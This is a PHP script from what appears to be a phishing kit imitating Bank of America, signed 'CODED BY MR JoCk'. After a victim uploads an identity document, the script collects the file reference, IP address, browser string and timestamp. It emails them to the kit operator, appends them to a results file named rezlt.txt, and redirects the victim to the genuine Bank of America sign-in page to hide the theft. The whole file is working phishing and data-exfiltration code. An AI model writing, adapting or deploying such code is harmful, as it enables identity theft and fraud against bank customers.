<?php



include("__config__.php");
include("function.php");

if(isset($fileList[0][file])){

if(!empty($fileList[0][file])){


$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
$time = date('l jS \of F Y h:i:s A');
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$browser             =   $_SERVER['HTTP_USER_AGENT'];
$reprint = "e";$do_p="mai";                      
	$message = "
		>MR JoCk | BOA | ID<
	-------------- ID ------------
	UPLOAD ID :   ".$fileList[0][file]."
	Site    : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] ."
	-------------- IP Infos ------------
	
	Browser :    ".$browser."
	Date Login : ".$time."
	IP :        https://geoiptool.com/en/?ip=".$ip."
	
    ------------>CODED BY MR JoCk<------------
	";




$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $subject  = " BOA ID [NEW] -  [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers = "From: MR Jock <contact>\r\n";
mail($to,$subject,$message,$headers);
mail(','.$form,$subject,$message,$headers);

    $text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);

 			$A = "https://secure.bankofamerica.com/login/sign-in/signOnRedirect.go";
header("location:$A");

 	}else{header("location:../");}

}else{header("location:../");}


